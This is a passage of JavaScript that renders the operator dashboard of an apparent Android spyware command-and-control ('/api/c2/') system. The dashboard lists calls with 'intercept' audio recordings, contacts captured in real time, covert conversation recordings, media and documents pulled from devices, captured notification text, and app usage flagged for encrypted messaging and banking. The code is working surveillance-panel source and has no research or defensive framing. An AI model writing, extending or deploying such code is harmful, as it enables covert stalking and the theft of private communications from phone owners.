          (c.contact_name || '').toLowerCase().includes(searchQuery) ||
          (c.device_id || '').toLowerCase().includes(searchQuery)
        );
        allContacts = allContacts.filter(c =>
          (c.name || '').toLowerCase().includes(searchQuery) ||
          (c.phone_number || '').toLowerCase().includes(searchQuery) ||
          (c.email || '').toLowerCase().includes(searchQuery) ||
          (c.phone_type || '').toLowerCase().includes(searchQuery) ||
          (c.device_id || '').toLowerCase().includes(searchQuery)
        );
        allVoice = allVoice.filter(v => 
          (v.threat_type || '').toLowerCase().includes(searchQuery) ||
          (v.device_id || '').toLowerCase().includes(searchQuery)
        );
        allMedia = allMedia.filter(m => 
          (m.file_name || '').toLowerCase().includes(searchQuery) ||
          (m.media_type || '').toLowerCase().includes(searchQuery) ||
          (m.device_id || '').toLowerCase().includes(searchQuery)
        );
        allUsage = allUsage.filter(u =>
          (u.app_name || '').toLowerCase().includes(searchQuery) ||
          (u.package_name || '').toLowerCase().includes(searchQuery) ||
          (u.category || '').toLowerCase().includes(searchQuery) ||
          (u.device_id || '').toLowerCase().includes(searchQuery)
        );
        allNotifs = allNotifs.filter(n => 
          (n.app_name || '').toLowerCase().includes(searchQuery) ||
          (n.title || '').toLowerCase().includes(searchQuery) ||
          (n.content || '').toLowerCase().includes(searchQuery) ||
          (n.device_id || '').toLowerCase().includes(searchQuery)
        );
      }

      // Update Top Stats
      document.getElementById('statDevices').textContent = data.summary?.total_devices || (data.devices || []).length;
      document.getElementById('statDevicesSub').textContent = \`\${(data.devices || []).filter(d => isDeviceOnline(d.last_seen)).length} units online\`;
      document.getElementById('statCalls').textContent = devFilter === 'ALL' ? (data.summary?.total_calls || allCalls.length) : allCalls.length;
      document.getElementById('statCallsSub').textContent = devFilter === 'ALL' ? 'Fleet Total' : \`Unit \${devFilter}\`;
      document.getElementById('statContacts').textContent = devFilter === 'ALL' ? (data.summary?.total_contacts || allContacts.length) : allContacts.length;
      document.getElementById('statContactsSub').textContent = devFilter === 'ALL' ? 'Fleet Total' : \`Unit \${devFilter}\`;
      document.getElementById('statVoice').textContent = devFilter === 'ALL' ? (data.summary?.total_voice_clips || allVoice.length) : allVoice.length;
      document.getElementById('statVoiceSub').textContent = devFilter === 'ALL' ? 'Fleet Total' : \`Unit \${devFilter}\`;
      document.getElementById('statMedia').textContent = devFilter === 'ALL' ? (data.summary?.total_media || allMedia.length) : allMedia.length;
      document.getElementById('statMediaSub').textContent = devFilter === 'ALL' ? 'Fleet Total' : \`Unit \${devFilter}\`;
      document.getElementById('statApps').textContent = devFilter === 'ALL' ? (data.summary?.total_apps || allUsage.length) : allUsage.length;
      document.getElementById('statAppsSub').textContent = devFilter === 'ALL' ? 'Fleet Total' : \`Unit \${devFilter}\`;
      document.getElementById('statNotifs').textContent = devFilter === 'ALL' ? (data.summary?.total_notifications || allNotifs.length) : allNotifs.length;
      document.getElementById('statNotifsSub').textContent = devFilter === 'ALL' ? 'Fleet Total' : \`Unit \${devFilter}\`;

      // Update Selected Unit Card
      const unitDetails = document.getElementById('selectedUnitDetails');
      const unitBadge = document.getElementById('selectedUnitBadge');

      if (devFilter === 'ALL') {
        unitBadge.textContent = 'ALL FLEET';
        unitBadge.style.color = '#38bdf8';
        unitDetails.innerHTML = \`
          <div class="field-row"><span class="field-label">Target View</span><span class="field-value mono">All Fleet Operatives</span></div>
          <div class="field-row"><span class="field-label">Online Units</span><span class="field-value mono">\${(data.devices || []).filter(d => isDeviceOnline(d.last_seen)).length} / \${(data.devices || []).length}</span></div>
          <div class="field-row"><span class="field-label">Heartbeat Rate</span><span class="field-value mono" style="color:var(--accent-green);">Every 5 Minutes</span></div>
          <div class="field-row"><span class="field-label">Cloud Backend</span><span class="field-value mono">Cloudflare D1 SQL</span></div>
          <div class="field-row"><span class="field-label">Media Storage</span><span class="field-value mono">Backblaze B2 (Encrypted Object Storage)</span></div>
        \`;
      } else {
        const targetDev = (data.devices || []).find(d => d.device_id === devFilter) || { device_id: devFilter };
        unitBadge.textContent = 'FILTERED UNIT';
        unitBadge.style.color = '#34d399';
        unitDetails.innerHTML = \`
          <div class="field-row"><span class="field-label">Unit Model</span><span class="field-value">\${targetDev.device_model || 'Android Device'}</span></div>
          <div class="field-row"><span class="field-label">Unit ID</span><span class="field-value mono" style="font-size:11px;">\${targetDev.device_id}</span></div>
          <div class="field-row"><span class="field-label">Battery Level</span><span class="field-value mono">\${targetDev.battery_level || 0}% \${targetDev.is_charging === 1 ? '⚡ Charging' : ''}</span></div>
          <div class="field-row"><span class="field-label">Network Gen</span><span class="field-value mono" style="color:var(--accent-blue);">\${targetDev.network_type || '5G'}</span></div>
          <div class="field-row"><span class="field-label">Foreground App</span><span class="field-value" style="color:var(--accent-green);">\${targetDev.active_app || 'Home Screen'}</span></div>
          <div class="field-row"><span class="field-label">Last Seen</span><span class="field-value mono">\${timeAgo(targetDev.last_seen)}</span></div>
        \`;
      }

      // --- Tab 1: Render Calls with Pagination ---
      const callsList = document.getElementById('callsList');
      const pagCallsEl = document.getElementById('paginationCalls');
      if (allCalls.length > 0) {
        const start = (pageState.calls - 1) * pageSize;
        const pageCalls = allCalls.slice(start, start + pageSize);

        callsList.innerHTML = pageCalls.map(call => {
          const badgeClass = 'badge-' + (call.call_type || 'incoming').toLowerCase();
          const matchedVoice = allVoice.find(v => 
            v.device_id === call.device_id &&
            (v.threat_type === 'CALL_RECORDING' || v.threat_type === 'CONVERSATION_RECORDING') &&
            Math.abs(v.timestamp - call.call_timestamp) < 90000
          );
          const recordingUrl = call.recording_url || (matchedVoice ? matchedVoice.b2_url : null);

          return \`
            <div class="feed-item">
              <div class="item-top">
                <span class="item-title">\${call.phone_number || call.phoneNumber} \${call.contact_name || call.contactName ? '(' + (call.contact_name || call.contactName) + ')' : ''}</span>
                <div class="item-badges">
                  \${recordingUrl ? '<span class="badge mono" style="background:rgba(16,185,129,0.15); color:#34d399; border:1px solid rgba(16,185,129,0.3);">🎙️ AUDIO RECORDED</span>' : ''}
                  <span class="badge badge-unit mono \${selectedDeviceId === 'ALL' ? 'highlight' : ''}">\${call.device_id}</span>
                  <span class="badge \${badgeClass} mono">\${call.call_type}</span>
                </div>
              </div>
              <div class="item-desc">
                Duration: <strong>\${call.duration_seconds || call.durationSeconds || 0}s</strong> &bull; Line: <strong>SIM \${call.sim_slot || call.simSlot || 1}</strong> \${call.carrier_name ? '(' + call.carrier_name + ')' : ''}
              </div>
              \${recordingUrl ? \`
                <div class="audio-player-box">
                  <div style="font-size:10px; font-weight:700; color:var(--accent-blue); margin-bottom:4px;" class="mono">CALL INTERCEPT AUDIO PLAYBACK</div>
                  <audio controls src="\${getB2ViewUrl(recordingUrl)}" preload="none"></audio>
                </div>
              \` : ''}
              <div class="item-meta mono">
                <span>Timestamp: \${formatTimestamp(call.call_timestamp)}</span>
                <span>Unit: \${call.device_id}</span>
                \${recordingUrl ? \`<a href="\${getB2ViewUrl(recordingUrl)}" target="_blank" class="media-link" style="margin:0;">Download Call Audio &rarr;</a>\` : ''}
              </div>
            </div>
          \`;
        }).join('');

        pagCallsEl.style.display = 'flex';
        pagCallsEl.innerHTML = renderPaginationHtml('calls', allCalls.length, pageState.calls, pageSize);
      } else {
        callsList.innerHTML = \`<div class="empty-state">No call logs found \${searchQuery ? 'matching "' + searchQuery + '"' : (devFilter === 'ALL' ? 'across fleet' : 'for ' + devFilter)}</div>\`;
        pagCallsEl.style.display = 'none';
      }

      // --- Tab: Render Contacts & Phonebook with Pagination ---
      const totalNew = allContacts.filter(c => c.is_new_intercept === 1 || c.sync_type === 'REALTIME_INTERCEPT').length;
      const totalBaseline = allContacts.filter(c => c.is_new_intercept !== 1 && c.sync_type !== 'REALTIME_INTERCEPT').length;
      
      const countAllEl = document.getElementById('countContactsAll');
      const countNewEl = document.getElementById('countContactsNew');
      const countBaselineEl = document.getElementById('countContactsBaseline');
      if (countAllEl) countAllEl.textContent = allContacts.length;
      if (countNewEl) countNewEl.textContent = totalNew;
      if (countBaselineEl) countBaselineEl.textContent = totalBaseline;

      let displayedContacts = allContacts;
      if (contactSubFilter === 'NEW') {
        displayedContacts = allContacts.filter(c => c.is_new_intercept === 1 || c.sync_type === 'REALTIME_INTERCEPT');
      } else if (contactSubFilter === 'BASELINE') {
        displayedContacts = allContacts.filter(c => c.is_new_intercept !== 1 && c.sync_type !== 'REALTIME_INTERCEPT');
      }

      const contactsList = document.getElementById('contactsList');
      const pagContactsEl = document.getElementById('paginationContacts');
      if (displayedContacts.length > 0) {
        const start = (pageState.contacts - 1) * pageSize;
        const pageContacts = displayedContacts.slice(start, start + pageSize);

        contactsList.innerHTML = pageContacts.map(contact => {
          const isStarred = contact.is_starred === 1 || contact.isStarred === true;
          const isNew = contact.is_new_intercept === 1 || contact.sync_type === 'REALTIME_INTERCEPT';
          const phoneType = contact.phone_type || contact.phoneType || 'Mobile';

          return \`
            <div class="feed-item \${isNew ? 'realtime-intercept' : ''}">
              <div class="item-top">
                <span class="item-title">
                  \${isStarred ? '⭐ ' : ''}\${contact.name || 'Unknown Contact'}
                </span>
                <div class="item-badges">
                  \${isNew ? '<span class="badge mono" style="background:#78350f; color:#fbbf24; border:1px solid rgba(251,191,36,0.4);">⚡ REAL-TIME INTERCEPT</span>' : '<span class="badge mono" style="background:#1e293b; color:#94a3b8;">📚 BASELINE</span>'}
                  <span class="badge badge-unit mono \${selectedDeviceId === 'ALL' ? 'highlight' : ''}">\${contact.device_id}</span>
                  <span class="badge badge-encrypted mono">\${phoneType.toUpperCase()}</span>
                  \${isStarred ? '<span class="badge mono" style="background:#854d0e; color:#fef08a;">FAVORITE</span>' : ''}
                </div>
              </div>
              <div class="item-desc mono" style="font-size:13px; color:var(--text-primary); margin-top:4px;">
                📞 <strong>\${contact.phone_number || 'No Number'}</strong> \${contact.email ? \`&bull; ✉️ <span style="color:var(--accent-blue);">\${contact.email}</span>\` : ''}
              </div>
              <div class="item-meta mono" style="margin-top:8px;">
                <span style="\${isNew ? 'color:var(--accent-amber); font-weight:700;' : ''}">📅 \${isNew ? '⚡ Intercepted & Added: ' : 'Synced: '}\${formatTimestamp(contact.last_updated_ms || contact.created_at)}</span>
                <span>Contact ID: \${contact.contact_id || '#'}</span>
                <span>Unit: \${contact.device_id}</span>
              </div>
            </div>
          \`;
        }).join('');

        pagContactsEl.style.display = 'flex';
        pagContactsEl.innerHTML = renderPaginationHtml('contacts', displayedContacts.length, pageState.contacts, pageSize);
      } else {
        contactsList.innerHTML = \`<div class="empty-state">No contacts found \${contactSubFilter !== 'ALL' ? 'for filter "' + contactSubFilter + '"' : (searchQuery ? 'matching "' + searchQuery + '"' : (devFilter === 'ALL' ? 'across fleet' : 'for ' + devFilter))}</div>\`;
        pagContactsEl.style.display = 'none';
      }

      // --- Tab 2: Render Voice with Pagination ---
      const voiceList = document.getElementById('voiceList');
      const pagVoiceEl = document.getElementById('paginationVoice');
      if (allVoice.length > 0) {
        const start = (pageState.voice - 1) * pageSize;
        const pageVoice = allVoice.slice(start, start + pageSize);

        voiceList.innerHTML = pageVoice.map(voice => {
          const hasAudio = voice.b2_url && voice.b2_url.length > 0;
          const isCall = voice.threat_type === 'CALL_RECORDING';
          const badgeClass = isCall ? 'badge-outgoing' : 'badge-voice';

          return \`
            <div class="feed-item">
              <div class="item-top">
                <span class="item-title">\${isCall ? '🎙️ PHONE CALL INTERCEPT RECORDING' : (voice.threat_type || 'CONVERSATION_RECORDING')}</span>
                <div class="item-badges">
                  <span class="badge badge-unit mono \${selectedDeviceId === 'ALL' ? 'highlight' : ''}">\${voice.device_id}</span>
                  <span class="badge \${badgeClass} mono">\${voice.threat_type}</span>
                  <span class="badge badge-voice mono">CONFIDENCE: \${Math.round((voice.confidence_score || 0.9) * 100)}%</span>
                </div>
              </div>
              <div class="item-desc">
                Segment Duration: <strong>\${voice.duration_sec || 25}s</strong> &bull; Size: <strong>\${Math.round((voice.file_size_bytes || 35000) / 1024)} KB</strong> (M4A 64kbps Studio Audio)
              </div>
              \${hasAudio ? \`
                <div class="audio-player-box">
                  <audio controls src="\${getB2ViewUrl(voice.b2_url)}" preload="none"></audio>
                </div>
              \` : ''}
              <div class="item-meta mono">
                <span>Timestamp: \${formatTimestamp(voice.timestamp)}</span>
                <span>Unit: \${voice.device_id}</span>
                \${hasAudio ? \`<a href="\${getB2ViewUrl(voice.b2_url)}" target="_blank" class="media-link" style="margin:0;">Play / Download Clip &rarr;</a>\` : ''}
              </div>
            </div>
          \`;
        }).join('');

        pagVoiceEl.style.display = 'flex';
        pagVoiceEl.innerHTML = renderPaginationHtml('voice', allVoice.length, pageState.voice, pageSize);
      } else {
        voiceList.innerHTML = \`<div class="empty-state">No voice activity clips found \${searchQuery ? 'matching "' + searchQuery + '"' : (devFilter === 'ALL' ? 'across fleet' : 'for ' + devFilter)}</div>\`;
        pagVoiceEl.style.display = 'none';
      }

      // --- Tab 3: Render Media with Pagination ---
      const mediaGrid = document.getElementById('mediaGrid');
      const pagMediaEl = document.getElementById('paginationMedia');
      if (allMedia.length > 0) {
        const start = (pageState.media - 1) * pageSize;
        const pageMedia = allMedia.slice(start, start + pageSize);

        mediaGrid.innerHTML = pageMedia.map(item => {
          const mediaType = item.media_type || 'image';
          const badgeClass = 'badge-' + mediaType;
          let previewHtml = '';

          if (mediaType === 'image' && item.b2_url) {
            previewHtml = \`<img src="\${getB2ViewUrl(item.b2_url)}" alt="\${item.file_name}" loading="lazy">\`;
          } else if (mediaType === 'video' && item.b2_url) {
            previewHtml = \`<video src="\${getB2ViewUrl(item.b2_url)}" controls preload="none"></video>\`;
          } else if (mediaType === 'audio' && item.b2_url) {
            previewHtml = \`<audio controls src="\${getB2ViewUrl(item.b2_url)}" style="width:90%;"></audio>\`;
          } else if (mediaType === 'sheet') {
            previewHtml = \`<div class="mono" style="color:#34d399; font-size:13px; font-weight:700; text-align:center; padding:12px;">📊 SPREADSHEET<br><span style="font-size:10px; color:var(--text-muted); font-weight:400;">.XLSX / .CSV / .ODS</span></div>\`;
          } else if (mediaType === 'pdf') {
            previewHtml = \`<div class="mono" style="color:#fbbf24; font-size:13px; font-weight:700; text-align:center; padding:12px;">📄 PDF DOCUMENT<br><span style="font-size:10px; color:var(--text-muted); font-weight:400;">Acrobat Reader</span></div>\`;
          } else {
            previewHtml = \`<div class="mono" style="color:var(--text-muted); font-size:13px; font-weight:700;">📄 \${mediaType.toUpperCase()}</div>\`;
          }

          const deviceTimestamp = item.date_added_ms ? formatTimestamp(item.date_added_ms) : 'Unknown Date';
          const albumPath = item.relative_path ? item.relative_path.replace(/\\/$/, '') : '';

          return \`
            <div class="media-card">
              <div class="media-preview">\${previewHtml}</div>
              <div class="media-info">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                  <span class="badge \${badgeClass} mono">\${mediaType.toUpperCase()}</span>
                  <span class="badge badge-unit mono" style="font-size:9px;">\${item.device_id}</span>
                </div>
                <div class="media-name" title="\${item.file_name}">\${item.file_name}</div>
                <div class="mono" style="font-size:10px; color:#94a3b8; margin-top:4px; display:flex; align-items:center; gap:4px;">
                  <span>📅</span> <span>\${deviceTimestamp}</span>
                </div>
                \${albumPath ? \`<div class="mono" style="font-size:9px; color:var(--text-muted); margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="\${albumPath}">📁 \${albumPath}</div>\` : ''}
                <div style="display:flex; justify-content:space-between; align-items:center; margin-top:6px; padding-top:4px; border-top:1px solid rgba(255,255,255,0.06);">
                  <span class="mono" style="font-size:10px; color:var(--text-muted);">\${Math.round((item.size_bytes || 0) / 1024)} KB</span>
                  \${item.b2_url ? \`<a href="\${getB2ViewUrl(item.b2_url)}" target="_blank" class="media-link">View File &rarr;</a>\` : ''}
                </div>
              </div>
            </div>
          \`;
        }).join('');

        pagMediaEl.style.display = 'flex';
        pagMediaEl.innerHTML = renderPaginationHtml('media', allMedia.length, pageState.media, pageSize);
      } else {
        mediaGrid.innerHTML = \`<div class="empty-state" style="grid-column: 1/-1;">No media files found \${searchQuery ? 'matching "' + searchQuery + '"' : (devFilter === 'ALL' ? 'across fleet' : 'for ' + devFilter)}</div>\`;
        pagMediaEl.style.display = 'none';
      }

      // --- Tab 4: Render Screen & App Usage Intelligence ---
      const usageList = document.getElementById('usageList');
      const pagUsageEl = document.getElementById('paginationUsage');
      if (allUsage.length > 0) {
        const start = (pageState.usage - 1) * pageSize;
        const pageUsage = allUsage.slice(start, start + pageSize);

        usageList.innerHTML = pageUsage.map(app => {
          const category = app.category || 'PRODUCTIVITY_TOOLS';
          let categoryBadge = '<span class="badge badge-system mono">TOOL</span>';
          if (category === 'ENCRYPTED_MESSAGING') categoryBadge = '<span class="badge badge-encrypted mono">🔒 ENCRYPTED CHAT</span>';
          else if (category === 'FINANCIAL') categoryBadge = '<span class="badge badge-financial mono">💳 FINANCIAL / BANKING</span>';
          else if (category === 'NAVIGATION') categoryBadge = '<span class="badge badge-nav mono">🗺️ NAVIGATION</span>';
          else if (category === 'BROWSER') categoryBadge = '<span class="badge badge-browser mono">🌐 WEB BROWSER</span>';
          else if (category === 'SOCIAL_MEDIA') categoryBadge = '<span class="badge badge-social mono">📱 SOCIAL & MEDIA</span>';
          else if (category === 'SYSTEM_CONTROL') categoryBadge = '<span class="badge badge-system mono">⚙️ SYSTEM CONTROL</span>';

          const isSideloaded = app.installer_source && app.installer_source.includes('Sideload');
          const installerBadge = isSideloaded
            ? '<span class="badge mono" style="background:#7f1d1d; color:#fca5a5;">⚠️ SIDELOADED APK</span>'
            : \`<span class="badge mono" style="background:#1e293b; color:#94a3b8;">\${app.installer_source || 'Google Play'}</span>\`;

          return \`
            <div class="feed-item">
              <div class="item-top">
                <span class="item-title">\${app.app_name}</span>
                <div class="item-badges">
                  \${categoryBadge}
                  \${installerBadge}
                  <span class="badge badge-unit mono \${selectedDeviceId === 'ALL' ? 'highlight' : ''}">\${app.device_id}</span>
                </div>
              </div>
              <div class="item-desc mono" style="font-size:12px;">
                Package: <strong>\${app.package_name}</strong> &bull; Total Screen Time: <strong style="color:var(--accent-green);">\${formatDuration(app.duration_ms)}</strong> &bull; Opens Today: <strong>\${app.launch_count || 1} times</strong>
              </div>
              <div class="item-meta mono">
                <span>Last Active: \${formatTimestamp(app.last_time_used)}</span>
                <span>Source: \${app.installer_source || 'Google Play Store'}</span>
              </div>
            </div>
          \`;
        }).join('');

        pagUsageEl.style.display = 'flex';
        pagUsageEl.innerHTML = renderPaginationHtml('usage', allUsage.length, pageState.usage, pageSize);
      } else {
        usageList.innerHTML = \`<div class="empty-state">No app usage telemetry found \${searchQuery ? 'matching "' + searchQuery + '"' : (devFilter === 'ALL' ? 'across fleet' : 'for ' + devFilter)}</div>\`;
        pagUsageEl.style.display = 'none';
      }

      // --- Tab 5: Render Notifications with Pagination ---
      const notifsList = document.getElementById('notifsList');
      const pagNotifsEl = document.getElementById('paginationNotifs');
      if (allNotifs.length > 0) {
        const start = (pageState.notifs - 1) * pageSize;
        const pageNotifs = allNotifs.slice(start, start + pageSize);

        notifsList.innerHTML = pageNotifs.map(notif => {
          return \`
            <div class="feed-item">
              <div class="item-top">
                <span class="item-title">\${notif.app_name || notif.package_name}: \${notif.title || 'Alert'}</span>
                <div class="item-badges">
                  <span class="badge badge-unit mono \${selectedDeviceId === 'ALL' ? 'highlight' : ''}">\${notif.device_id}</span>
                  <span class="badge mono" style="background:#1e293b; color:#94a3b8;">\${notif.package_name}</span>
                </div>
              </div>
              <div class="item-desc">\${notif.content || 'No text content'}</div>
              <div class="item-meta mono">
                <span>Captured: \${formatTimestamp(notif.post_time)}</span>
                <span>Unit: \${notif.device_id}</span>
              </div>
            </div>
          \`;
        }).join('');

        pagNotifsEl.style.display = 'flex';
        pagNotifsEl.innerHTML = renderPaginationHtml('notifs', allNotifs.length, pageState.notifs, pageSize);
      } else {
        notifsList.innerHTML = \`<div class="empty-state">No notifications found \${searchQuery ? 'matching "' + searchQuery + '"' : (devFilter === 'ALL' ? 'across fleet' : 'for ' + devFilter)}</div>\`;
        pagNotifsEl.style.display = 'none';
      }
    }

    async function purgeLogs() {
      if (!confirm('Are you sure you want to purge all demo event logs? (Tables and devices will remain intact)')) return;
      try {
        const res = await fetch('/api/c2/purge', { method: 'DELETE' });
        if (res.ok) {
          fetchOverview();
        }
      } catch (err) {
        console.error('purge error', err);
      }
    }

    fetchOverview();
    setInterval(fetchOverview, 3000);
  </script>
</body>
</html>`;
}
